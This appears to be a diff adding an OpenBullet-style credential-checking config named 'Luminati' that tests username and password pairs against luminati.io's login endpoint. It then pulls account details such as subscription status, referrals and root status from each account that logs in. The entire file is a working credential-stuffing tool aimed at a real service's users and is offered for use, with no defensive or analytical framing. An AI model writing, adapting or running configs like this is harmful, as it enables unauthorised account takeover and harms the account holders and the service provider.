@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "Luminati",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-01T13:27:20.5834729-04:00",
+  "AdditionalInfo": "",
+  "Author": "LethalLuck",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://luminati.io/users/auth/basic/check_credentials" AutoRedirect=FALSE ParseQuery=TRUE EncodeContent=TRUE 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/plain, */*; q=0.01" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Host: luminati.io" 
+  HEADER "Origin: https://luminati.io" 
+  HEADER "Referer: https://luminati.io/sdk" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "connect.sid" 
+  KEYCHAIN Failure OR 
+    KEY "unauthorized" 
+    KEY "not_registered" 
+
+REQUEST GET "https://luminati.io/users/get_user" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "provider" -> CAP "Provider" 
+
+PARSE "<SOURCE>" JSON "referrals" -> CAP "Referrals" 
+
+PARSE "<SOURCE>" JSON "is_root" -> CAP "Root" 
+
+PARSE "<SOURCE>" JSON "count" -> CAP "Count(?)" 
+
+PARSE "<SOURCE>" JSON "lum_status_subscription" -> CAP "Subscribed" 
+
